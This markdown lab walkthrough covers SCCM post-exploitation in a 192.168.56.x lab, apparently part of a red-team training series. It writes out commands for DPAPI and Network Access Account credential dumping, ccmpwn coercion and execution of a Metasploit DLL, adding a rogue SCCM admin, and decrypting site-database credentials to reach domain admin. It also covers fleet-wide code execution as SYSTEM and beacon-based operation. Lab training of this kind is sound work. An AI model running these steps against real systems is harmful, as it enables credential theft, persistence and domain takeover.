# SCCM part 3 - admin user and post exploitation

Adapts mayfly's SCCM LAB part 0x3. Two starting points: local admin on the
client, and a full SCCM admin account (reached in [part 2](part-02-low-user.md)).
Each unlocks a different set of credential and execution primitives.

## From local admin on the client

### Cred 3 - DPAPI credentials

CRED-3. As local admin on the client, recover the Network Access Account and
other stored secrets from DPAPI:

```
proxychains -q sccmhunter.py dpapi -u administrator -p '<pass>' -target 192.168.56.4 -debug
```

### Cred 4 - legacy credentials

CRED-4. Older client versions store the NAA in the WMI CCM_NetworkAccessAccount
class, recoverable with the same local admin.

### Impersonate connected users

With admin on the client you can coerce or spawn a session as users currently
logged on, using ccmpwn:

```
proxychains -q python3 ccmpwn.py 'CLIENT'/administrator:'<pass>'@192.168.56.4 coerce -computer 192.168.56.1
proxychains -q python3 ccmpwn.py 'CLIENT'/administrator:'<pass>'@192.168.56.4 exec -dll msf.dll -config msf.config
```

## From an SCCM admin account

### Add a new admin

Persist by adding a controlled principal as a Full Administrator:

```
proxychains -q sccmhunter.py admin -u <user>@sccm.lab -p '<pass>' -ip 192.168.56.3 -debug
```

sccmhunter's `admin` module talks to the SMS Provider AdminService and can add a
computer account you control as an admin (`-au 'approval$' -ap '...'`).

### Recon 4 - CMPivot

RECON-4. CMPivot runs live queries against managed clients from the console or
the AdminService. Enumerate installed software, logged on users, or files across
the estate without touching each host directly.

### Exec - application and script deployment

EXEC-1 and EXEC-2. As an SCCM admin, deploy an application or a PowerShell script
to a device collection. This is the intended management function turned into
fleet wide code execution as SYSTEM on every targeted client.

### Cred 5 - site database credentials

CRED-5. With admin access, pull the encrypted account credentials from the site
database and decrypt them (the gist-based decrypt mayfly uses). This yields the
service and account passwords the site stores, including any domain admin
grade account used to run the site.

```
proxychains -q nxc smb 192.168.56.5 -u sccm-account-da -p '<recovered>' -d sccm.lab
```

If a recovered account is a domain admin, this closes the loop from low user to
domain compromise entirely through SCCM.

## redStackPRO notes to confirm at live run

- **Local admin on the client.** CRED-3 and CRED-4 need admin on
  `192.168.56.4`. In this build that is reached via the lab password on the
  client's local administrator, or by a domain path from parts 1 and 2.
- **Site database decrypt.** CRED-5 depends on the site storing a recoverable
  high privilege account. Confirm what the sccm role provisions as the site
  account and whether it is DA grade; if not, note the ceiling.
- **Everything through the beacon.** Per the standing mandate, prefer running
  CMPivot and script deployment through a beacon on the site server rather than
  a direct AdminService hit from Kali, and record which method was used.

## Step results

| step | id | result | notes |
|------|----|--------|-------|
| DPAPI creds | CRED-3 | | needs local admin on client |
| legacy creds | CRED-4 | | needs local admin on client |
| add SCCM admin | - | | |
| CMPivot | RECON-4 | | |
| SMS provider enum | RECON-5 | | |
| app deployment | EXEC-1 | | |
| script deployment | EXEC-2 | | |
| site DB creds | CRED-5 | | |
